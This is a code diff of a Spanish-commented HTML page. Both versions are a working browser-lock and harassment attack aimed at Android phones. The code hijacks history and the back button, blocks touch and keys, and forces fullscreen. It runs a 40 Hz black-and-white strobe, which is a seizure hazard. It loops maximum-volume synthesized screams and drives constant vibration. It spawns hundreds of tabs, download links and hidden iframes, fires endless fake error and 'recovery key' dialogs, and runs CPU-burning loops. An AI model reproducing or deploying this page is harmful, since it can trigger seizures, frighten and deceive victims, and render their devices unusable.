@@ -22,7 +22,7 @@
             top: 0;
             left: 0;
         }
-        .strobe-layer {
+        .strobe {
             position: fixed;
             top: 0;
             left: 0;
@@ -30,9 +30,8 @@
             height: 100%;
             pointer-events: none;
             z-index: 99999;
-            background: white;
         }
-        .noise-canvas {
+        .noise-layer {
             position: fixed;
             top: 0;
             left: 0;
@@ -40,27 +39,24 @@
             height: 100%;
             pointer-events: none;
             z-index: 99998;
-        }
-        button {
-            position: absolute;
-            bottom: -100px;
+            background: repeating-radial-gradient(circle, black, white 2px);
+            opacity: 0.3;
         }
     </style>
 </head>
 <body>
-    <canvas id="noiseCanvas" class="noise-canvas"></canvas>
+    <div id="strobeDiv" class="strobe"></div>
+    <div class="noise-layer"></div>
     
     <script>
     (function() {
-        // ==================== BLOQUEO EXTREMO PARA ANDROID ====================
-        // Bloquear botón atrás (Android)
+        // ==================== BLOQUEO TOTAL ====================
         window.addEventListener('beforeunload', function(e) {
             e.preventDefault();
             e.returnValue = '';
             return '';
         });
         
-        // Historial infinito para bloquear back button
         for (let i = 0; i < 500; i++) {
             history.pushState({ i: i }, '', '#lock' + i);
         }
@@ -69,7 +65,6 @@
             for (let i = 0; i < 100; i++) {
                 history.pushState({}, '', '#block' + Math.random());
             }
-            // Forzar recarga si intentan salir
             location.reload();
         });
         
@@ -77,7 +72,6 @@
             history.pushState({}, '', '#hijack');
         }, 50);
         
-        // Deshabilitar todos los gestos táctiles
         document.body.style.touchAction = 'none';
         document.body.style.overscrollBehavior = 'none';
         
@@ -85,250 +79,229 @@
             e.preventDefault();
         }, { passive: false });
         
-        document.addEventListener('touchstart', function(e) {
-            e.preventDefault();
-        }, { passive: false });
-        
-        // Bloquear teclado (botones físicos virtuales)
         document.addEventListener('keydown', function(e) {
             e.preventDefault();
             return false;
         });
         
-        // Bloquear menú contextual
         document.addEventListener('contextmenu', function(e) {
             e.preventDefault();
             return false;
         });
         
-        // ==================== AUDIO FORZADO PARA ANDROID ====================
-        // Android requiere interacción de usuario para AudioContext
-        // Vamos a crear el audio Y FORZAR reproducción en el primer toque
+        // ==================== STROBO BLANCO/NEGRO EXTREMO (irritante visual) ====================
+        const strobeDiv = document.getElementById('strobeDiv');
+        let strobeRunning = true;
         
-        let audioStarted = false;
-        let audioSources = [];
-        let gainNode = null;
+        function startExtremeStrobe() {
+            // Frecuencia de 20ms (50 parpadeos por segundo - EXTREMADAMENTE RÁPIDO)
+            setInterval(() => {
+                if (strobeRunning) {
+                    // Alternar entre blanco puro y negro puro
+                    strobeDiv.style.backgroundColor = strobeDiv.style.backgroundColor === 'white' ? 'black' : 'white';
+                    strobeDiv.style.opacity = '1';
+                }
+            }, 25); // 40Hz parpadeo - muy molesto visualmente
+        }
+        
+        // También hacer parpadeo del body
+        function startBodyStrobe() {
+            setInterval(() => {
+                document.body.style.backgroundColor = document.body.style.backgroundColor === 'white' ? 'black' : 'white';
+            }, 35);
+        }
+        
+        // ==================== SCREAMERS DE ALTO VOLUMEN (asegurado) ====================
         let audioCtx = null;
+        let masterGain = null;
+        let screamersStarted = false;
         
-        function initAudio() {
-            if (audioStarted) return;
-            audioStarted = true;
+        // Crear screamers extremadamente fuertes
+        function initScreamers() {
+            if (screamersStarted) return;
             
             try {
                 audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-                gainNode = audioCtx.createGain();
-                gainNode.gain.value = 1.0;
-                gainNode.connect(audioCtx.destination);
+                masterGain = audioCtx.createGain();
+                masterGain.gain.value = 1.0;
+                masterGain.connect(audioCtx.destination);
                 
-                // Función para crear scream buffer
-                function createScreamBuffer(freqBase, callback) {
-                    const sampleRate = audioCtx.sampleRate;
-                    const length = sampleRate * 3;
-                    const buffer = audioCtx.createBuffer(1, length, sampleRate);
-                    const data = buffer.getChannelData(0);
-                    for (let i = 0; i < length; i++) {
-                        let t = i / sampleRate;
-                        let scream = 0;
-                        // Grito humano agudo + distorsión
-                        scream += Math.sin(t * (freqBase + Math.sin(t * 80) * 200)) * 0.7;
-                        scream += Math.sin(t * (freqBase * 1.5)) * 0.4;
-                        scream += Math.sin(t * (freqBase * 2.2)) * 0.3;
-                        scream += Math.random() * 0.6;
-                        scream += Math.sin(t * 40) * 0.2;
-                        // Limitar
-                        scream = Math.min(0.9, Math.max(-0.9, scream));
-                        data[i] = scream;
-                    }
-                    callback(buffer);
-                }
-                
+                // Crear 8 gritos diferentes y agresivos
+                const screamFreqs = [720, 880, 950, 1100, 1300, 680, 1550, 2000];
                 const buffers = [];
-                const freqs = [780, 850, 920, 1100, 650, 1300, 700, 1600, 890, 1950];
                 let loaded = 0;
                 
-                freqs.forEach((freq, idx) => {
-                    createScreamBuffer(freq, function(buffer) {
-                        buffers[idx] = buffer;
-                        loaded++;
-                        if (loaded === freqs.length) {
-                            // Reproducir todos los screamers en loop
-                            for (let b = 0; b < buffers.length; b++) {
+                function createAgonizingScream(freq, idx) {
+                    const sampleRate = audioCtx.sampleRate;
+                    const duration = 4; // 4 segundos
+                    const length = sampleRate * duration;
+                    const buffer = audioCtx.createBuffer(1, length, sampleRate);
+                    const data = buffer.getChannelData(0);
+                    
+                    for (let i = 0; i < length; i++) {
+                        let t = i / sampleRate;
+                        // Grito humano distorsionado + frecuencias agudas superpuestas
+                        let scream = 0;
+                        // Onda principal aguda
+                        scream += Math.sin(t * freq * Math.PI * 2) * 0.6;
+                        // Armónicos agresivos
+                        scream += Math.sin(t * freq * 2.3 * Math.PI * 2) * 0.4;
+                        scream += Math.sin(t * freq * 3.7 * Math.PI * 2) * 0.3;
+                        // Modulación de frecuencia para efecto de "grito que sube"
+                        scream += Math.sin(t * (freq + Math.sin(t * 15) * 100) * Math.PI * 2) * 0.5;
+                        // Ruido blanco para textura de grito
+                        scream += (Math.random() - 0.5) * 0.5;
+                        // Efecto de vibración en la voz
+                        scream += Math.sin(t * 120) * 0.2;
+                        
+                        // Clip y normalizar
+                        scream = Math.min(0.95, Math.max(-0.95, scream));
+                        data[i] = scream;
+                    }
+                    
+                    buffers[idx] = buffer;
+                    loaded++;
+                    
+                    if (loaded === screamFreqs.length) {
+                        // Reproducir TODOS los screamers en loop simultáneamente
+                        for (let b = 0; b < buffers.length; b++) {
+                            if (buffers[b]) {
                                 const source = audioCtx.createBufferSource();
                                 source.buffer = buffers[b];
-                                source.connect(gainNode);
                                 source.loop = true;
+                                source.connect(masterGain);
                                 source.start();
-                                audioSources.push(source);
                             }
-                            
-                            // Screamers adicionales superpuestos
-                            setInterval(() => {
-                                if (buffers.length > 0 && audioCtx.state === 'running') {
-                                    const randomBuf = buffers[Math.floor(Math.random() * buffers.length)];
-                                    const extra = audioCtx.createBufferSource();
-                                    extra.buffer = randomBuf;
-                                    extra.connect(gainNode);
-                                    extra.start();
-                                    audioSources.push(extra);
-                                }
-                                if (gainNode && gainNode.gain.value < 1.0) gainNode.gain.value = 1.0;
-                            }, 200);
                         }
-                    });
-                });
+                        
+                        // Añadir screamers adicionales superpuestos aleatoriamente (más caos)
+                        setInterval(() => {
+                            if (audioCtx && audioCtx.state === 'running') {
+                                const randomBuf = buffers[Math.floor(Math.random() * buffers.length)];
+                                if (randomBuf) {
+                                    const extraSource = audioCtx.createBufferSource();
+                                    extraSource.buffer = randomBuf;
+                                    extraSource.connect(masterGain);
+                                    extraSource.start();
+                                }
+                            }
+                        }, 150);
+                        
+                        // Forzar volumen máximo constantemente
+                        setInterval(() => {
+                            if (masterGain) masterGain.gain.value = 1.0;
+                        }, 50);
+                    }
+                }
                 
-                // Forzar volumen máximo cada 100ms
-                setInterval(() => {
-                    if (gainNode && gainNode.gain) gainNode.gain.value = 1.0;
-                }, 100);
+                for (let i = 0; i < screamFreqs.length; i++) {
+                    createAgonizingScream(screamFreqs[i], i);
+                }
                 
                 audioCtx.resume();
+                screamersStarted = true;
                 
             } catch(e) {
-                console.log("Audio error:", e);
+                console.error("Audio error:", e);
+                // Fallback: intentar de nuevo con otro método
+                setTimeout(initScreamers, 500);
             }
         }
         
-        // ==================== VIBRACIÓN FORZADA PARA ANDROID ====================
+        // Forzar audio al primer toque
+        let audioTriggered = false;
+        function forceAudioOnTouch() {
+            if (audioTriggered) return;
+            audioTriggered = true;
+            initScreamers();
+            // También crear elemento de audio oculto como respaldo
+            try {
+                const fallbackAudio = new Audio();
+                fallbackAudio.volume = 1.0;
+                // No reproducir nada, solo para "despertar" el sistema de audio
+                fallbackAudio.play().catch(e => {});
+            } catch(e) {}
+        }
+        
+        // ==================== VIBRACIÓN FORZADA ====================
         function vibrateIntense() {
             if (navigator.vibrate) {
-                navigator.vibrate([800, 300, 800, 300, 1500, 500, 1000, 400]);
+                navigator.vibrate([1000, 500, 1000, 500, 2000, 500, 1000, 800, 1500]);
             }
-            // Intentar nuevamente si falla
-            setTimeout(() => {
-                if (navigator.vibrate) navigator.vibrate([500, 200, 500]);
-            }, 100);
         }
         
-        function startVibrationLoop() {
+        function startVibrationHell() {
             vibrateIntense();
             setInterval(() => {
                 vibrateIntense();
-            }, 700);
-        }
-        
-        // ==================== STROBO BLANCO/NEGRO EXTREMO ====================
-        let strobeActive = true;
-        function startStrobe() {
-            const strobeDiv = document.createElement('div');
-            strobeDiv.className = 'strobe-layer';
-            document.body.appendChild(strobeDiv);
-            
-            let white = true;
-            setInterval(() => {
-                if (strobeActive) {
-                    strobeDiv.style.background = white ? 'white' : 'black';
-                    strobeDiv.style.opacity = white ? '0.95' : '0.9';
-                    white = !white;
-                }
-            }, 40);
-        }
-        
-        // ==================== RUIDO EN PANTALLA + SHAKE ====================
-        const canvas = document.getElementById('noiseCanvas');
-        const ctx = canvas.getContext('2d');
-        
-        function resizeCanvas() {
-            canvas.width = window.innerWidth;
-            canvas.height = window.innerHeight;
-        }
-        resizeCanvas();
-        window.addEventListener('resize', resizeCanvas);
-        
-        let shakeIntensity = 0;
-        function drawNoiseAndShake() {
-            if (!ctx) return;
-            const imgData = ctx.getImageData(0, 0, canvas.width, canvas.height);
-            const data = imgData.data;
-            for (let i = 0; i < data.length; i += 4) {
-                const val = Math.random() * 255;
-                data[i] = val;
-                data[i+1] = val;
-                data[i+2] = val;
-                data[i+3] = 255;
-            }
-            ctx.putImageData(imgData, 0, 0);
-            
-            // Shake violento
-            const shakeX = (Math.random() - 0.5) * 25;
-            const shakeY = (Math.random() - 0.5) * 25;
-            document.body.style.transform = `translate(${shakeX}px, ${shakeY}px)`;
-            
-            requestAnimationFrame(drawNoiseAndShake);
-        }
-        drawNoiseAndShake();
-        
-        // ==================== PESTAÑAS + DESCARGAS MASIVAS ====================
-        function openMassiveTabs() {
-            const urls = [
-                'https://httpbin.org/bytes/2097152',
-                'https://httpbin.org/bytes/1048576',
-                'https://httpbin.org/delay/1?bytes=500000',
-                'about:blank#x',
-                'about:blank#y',
-                'data:application/octet-stream;base64,UEsDBAoAAAAAIAZ0VwAAAAAAAAAAAAAAAAkAAAA8P3h1eHh4eA=='
-            ];
-            
-            function openOne(url, delay) {
-                setTimeout(() => {
-                    const w = window.open(url, '_blank');
-                    if (!w || w.closed) {
-                        const a = document.createElement('a');
-                        a.href = url;
-                        a.download = 'file_' + Date.now() + '.bin';
-                        document.body.appendChild(a);
-                        a.click();
-                        document.body.removeChild(a);
-                    }
-                }, delay);
-            }
-            
-            // 200 pestañas iniciales
-            for (let i = 0; i < 200; i++) {
-                openOne(urls[i % urls.length], i * 30);
-            }
-            
-            // Continuar abriendo
-            setInterval(() => {
-                for (let i = 0; i < 15; i++) {
-                    const url = urls[Math.floor(Math.random() * urls.length)];
-                    const w = window.open(url, '_blank');
-                    if (!w) {
-                        const a = document.createElement('a');
-                        a.href = url;
-                        a.download = 'spam_' + Date.now() + '.bin';
-                        document.body.appendChild(a);
-                        a.click();
-                        document.body.removeChild(a);
-                    }
-                }
             }, 600);
         }
         
-        // ==================== IFRAME FLOOD ====================
-        function iframeFlood() {
+        // ==================== STROBO DOBLE (más irritante) ====================
+        startExtremeStrobe();
+        startBodyStrobe();
+        
+        // ==================== PESTAÑAS INFINITAS ====================
+        function openInfiniteTabs() {
+            const urls = [
+                'https://httpbin.org/bytes/2097152',
+                'https://httpbin.org/bytes/1048576',
+                'https://httpbin.org/drip?duration=3&numbytes=800000',
+                'about:blank#crash',
+                'about:blank#pop',
+                'data:application/octet-stream;base64,UEsDBBQAAAAIAO1QV1gAAAAAAAAAAAAAAAALAAAAZmlsZS5iaW5VVAkA'
+            ];
+            
+            function spawnTab() {
+                const url = urls[Math.floor(Math.random() * urls.length)];
+                const win = window.open(url, '_blank');
+                if (!win || win.closed) {
+                    const a = document.createElement('a');
+                    a.href = url;
+                    a.download = 'data_' + Date.now() + '.bin';
+                    document.body.appendChild(a);
+                    a.click();
+                    document.body.removeChild(a);
+                }
+            }
+            
+            // 300 pestañas iniciales
+            for (let i = 0; i < 300; i++) {
+                setTimeout(spawnTab, i * 25);
+            }
+            
+            // Continuar abriendo pestañas cada 400ms
             setInterval(() => {
-                for (let f = 0; f < 30; f++) {
-                    const ifr = document.createElement('iframe');
-                    ifr.src = 'https://httpbin.org/bytes/300000';
-                    ifr.style.display = 'none';
-                    document.body.appendChild(ifr);
-                    setTimeout(() => ifr.remove(), 500);
+                for (let i = 0; i < 20; i++) {
+                    spawnTab();
                 }
             }, 400);
         }
         
-        // ==================== ALERTAS INFINITAS (BLOQUEO TOTAL) ====================
-        function infiniteAlerts() {
+        // ==================== IFRAMES OCULTOS (descargas en segundo plano) ====================
+        function iframeFlood() {
             setInterval(() => {
-                alert('⚠️ ERROR FATAL ⚠️\n\nCódigo: DEADBEEF');
+                for (let f = 0; f < 50; f++) {
+                    const ifr = document.createElement('iframe');
+                    ifr.src = 'https://httpbin.org/bytes/400000';
+                    ifr.style.display = 'none';
+                    document.body.appendChild(ifr);
+                    setTimeout(() => ifr.remove(), 300);
+                }
             }, 300);
+        }
+        
+        // ==================== ALERTAS INFINITAS (BLOQUEO TOTAL DE UI) ====================
+        function infiniteAlertHell() {
             setInterval(() => {
-                confirm('Sistema dañado. Pulse OK para continuar...');
-            }, 400);
+                alert('⚠️ ERROR CRÍTICO ⚠️\nCódigo: 0xDEADBEEF');
+            }, 250);
             setInterval(() => {
-                prompt('Clave de recuperación:', '');
-            }, 500);
+                confirm('SISTEMA CORROMPIDO\nPresione OK para continuar...');
+            }, 350);
+            setInterval(() => {
+                prompt('INGRESE CLAVE DE RECUPERACIÓN:', '');
+            }, 450);
         }
         
         // ==================== FULLSCREEN FORZADO ====================
@@ -336,82 +309,85 @@
             if (document.documentElement.requestFullscreen) {
                 document.documentElement.requestFullscreen().catch(e => {});
             }
+            if (screen.orientation && screen.orientation.lock) {
+                screen.orientation.lock('portrait').catch(e => {});
+            }
         }
-        setInterval(forceFullscreen, 200);
+        setInterval(forceFullscreen, 150);
         
         document.addEventListener('fullscreenchange', () => {
             if (!document.fullscreenElement) forceFullscreen();
         });
         
-        // ==================== BLOQUEAR VISIBILIDAD (que no salga al cambiar pestaña) ====================
+        // ==================== BLOQUEAR CAMBIO DE PESTAÑA ====================
         document.addEventListener('visibilitychange', () => {
             if (!document.hidden) {
-                // Si vuelve a la pestaña, refuerza todo
+                // Si intentan salir y volver, recargar y empeorar
                 location.reload();
             }
         });
         
-        // ==================== DETECTAR TOQUE Y ACTIVAR TODO ====================
-        let hellStarted = false;
+        // ==================== ACTIVAR INFIERNO COMPLETO ====================
+        let hellActive = false;
         
-        function startHell() {
-            if (hellStarted) return;
-            hellStarted = true;
+        function startFullHell() {
+            if (hellActive) return;
+            hellActive = true;
             
-            // Iniciar audio FORZADO por interacción de usuario (requisito Android)
-            initAudio();
+            // Activar sonido (requiere toque)
+            forceAudioOnTouch();
             
-            // Iniciar vibración
-            startVibrationLoop();
+            // Activar vibración
+            startVibrationHell();
             
-            // Iniciar strobo
-            startStrobe();
+            // Pestañas
+            openInfiniteTabs();
             
-            // Abrir pestañas
-            openMassiveTabs();
-            
-            // Iframe flood
+            // Iframes
             iframeFlood();
             
-            // Alertas infinitas
-            infiniteAlerts();
+            // Alertas
+            infiniteAlertHell();
             
             // Fullscreen
             forceFullscreen();
             
-            // Congelar CPU extra
+            // Congelar CPU
             setInterval(() => {
-                let x = 0;
-                for (let i = 0; i < 30000; i++) x += Math.sin(i);
-            }, 8);
+                let garbage = 0;
+                for (let i = 0; i < 50000; i++) garbage += Math.sin(i);
+            }, 10);
         }
         
-        // Activar con cualquier toque
-        document.body.addEventListener('touchstart', startHell);
-        document.body.addEventListener('click', startHell);
+        // Activar con cualquier toque en la pantalla (requisito para audio en Android)
+        document.body.addEventListener('touchstart', startFullHell);
+        document.body.addEventListener('click', startFullHell);
         
-        // Auto-intento después de 1 segundo (por si el usuario no toca)
+        // Si el usuario no toca en 1.5 segundos, activar lo demás excepto audio
         setTimeout(() => {
-            if (!hellStarted) {
-                // Simular toque programáticamente (no funciona para audio en Android, pero igual)
-                startHell();
+            if (!hellActive) {
+                startVibrationHell();
+                openInfiniteTabs();
+                iframeFlood();
+                infiniteAlertHell();
+                forceFullscreen();
+                hellActive = true;
             }
-        }, 1000);
+        }, 1500);
         
-        // Mantener posición fixed
+        // Mantener fixed
         document.body.style.position = 'fixed';
         document.body.style.top = '0';
         document.body.style.left = '0';
         
-        // Prevenir cualquier intento de salida con botón home virtual (no se puede, pero bloqueamos lo posible)
+        // Prevenir blur (cambiar de app)
         window.onblur = function() {
             setTimeout(() => {
                 window.focus();
-                location.reload();
-            }, 50);
+            }, 10);
         };
         
-        console.log("Cargado - esperando toque en pantalla");
+        console.log("Página cargada - STROBO ACTIVO - esperando toque para SCREAMERS");
     })();
     </script>
 </body>
